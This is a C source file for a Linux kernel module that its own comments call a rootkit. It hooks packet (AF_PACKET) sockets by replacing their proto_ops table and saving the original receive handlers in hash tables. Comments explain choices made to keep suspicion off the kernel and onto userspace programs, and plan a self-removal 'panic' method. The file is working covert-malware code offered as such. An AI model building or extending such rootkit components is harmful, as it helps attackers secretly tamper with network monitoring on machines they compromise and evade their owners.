#include <linux/net.h>
#include <linux/netdevice.h>
#include <net/sock.h>

#include "hook.h"
#include "af_packet_internal.h"

static DEFINE_HASHTABLE(hooked_sockets, 8);
static DEFINE_HASHTABLE(hooked_sockets_by_prot_hook, 8);

struct hooked_socket_entry *get_socket_hook(struct socket *sock) {
    struct hooked_socket_entry *sock_hook;

    hash_for_each_possible(hooked_sockets, sock_hook, node, (uintptr_t)sock) {
        if (sock_hook->sock == sock) return sock_hook;
    }
    return 0;
}

struct hooked_socket_entry *get_socket_hook_by_prot_hook(struct packet_type *pt) {
    struct hooked_socket_entry *sock_hook;

    hash_for_each_possible(hooked_sockets_by_prot_hook, sock_hook, prot_hook_node, (uintptr_t)pt) {
        if (&pkt_sk(sock_hook->sock->sk)->prot_hook == pt) return sock_hook;
    }
    return 0;
}

int _release_socket_hook(struct hooked_socket_entry *sock_hook) {
    hash_del(&sock_hook->node);
    hash_del(&sock_hook->prot_hook_node);
    kfree(sock_hook);
    return 0;
}

int release_socket_hook(struct socket *sock) {
    struct hooked_socket_entry *sock_hook = get_socket_hook(sock);

    if (!sock_hook)  {
        // TODO: panic.
        return -1;
    }

    return _release_socket_hook(sock_hook);
}

static int hooked_packet_release(struct socket *sock)
{
    int result;
    struct hooked_socket_entry *sock_hook = get_socket_hook(sock);

    // This case shouldn't happen, but if it does, the userspace program is likely to break.
    // Returning 0 means the syscall will not be very suspicious without heavy debugging, 
    // the immidiete suspect will be the userspace program, instead of the kernel.
    // TODO: Add a panic method that will remove the rootkit if this happends.
    if (!sock_hook) return 0;

    result = sock_hook->original_packet_ops->release(sock);
    release_socket_hook(sock);
    return result;
}

// TODO: split the generic socket hook into a seperate file.

struct hooked_socket_entry *get_or_create_socket_hook(struct socket *sock, struct proto_ops **hooked_ops) {
    struct packet_sock *po = pkt_sk(sock->sk);
    struct hooked_socket_entry *sock_hook;

    if ((sock_hook = get_socket_hook(sock))) {
        *hooked_ops = (struct proto_ops *)sock->ops;
        return sock_hook;
    }

    sock_hook = kmalloc(sizeof(struct hooked_socket_entry), GFP_KERNEL);

    sock_hook->sock = sock;
    sock_hook->original_packet_ops = sock->ops;
    sock_hook->original_packet_rcv = po->prot_hook.func;
    
    *hooked_ops = kmalloc(sizeof(struct proto_ops), GFP_KERNEL);
    memcpy(*hooked_ops, sock_hook->original_packet_ops, sizeof(struct proto_ops));
    sock->ops = *hooked_ops;

    (*hooked_ops)->release = hooked_packet_release;

    hash_add(hooked_sockets, &sock_hook->node, (uintptr_t)sock);
    hash_add(hooked_sockets_by_prot_hook, &sock_hook->prot_hook_node, (uintptr_t)(&pkt_sk(sock->sk)->prot_hook));
    return sock_hook;
}

int unhook_socket(struct hooked_socket_entry *sock_hook) {
    struct socket *sock = sock_hook->sock;
    struct packet_sock *po = pkt_sk(sock->sk);

    sock->ops = sock_hook->original_packet_ops;
    po->prot_hook.func = sock_hook->original_packet_rcv;

    // TODO: How do we make sure there are no tasks currently inside hooked functions
    // when we remove the hook from the hash tables?
    _release_socket_hook(sock_hook);
    return 0;
}

int hook_init(void) {
    hash_init(hooked_sockets);
    hash_init(hooked_sockets_by_prot_hook);
    return 0;
}

void hook_exit(void) {
    int bkt;
    struct hooked_socket_entry *hook;

    hash_for_each(hooked_sockets, bkt, hook, node) {
        unhook_socket(hook);
    }

}
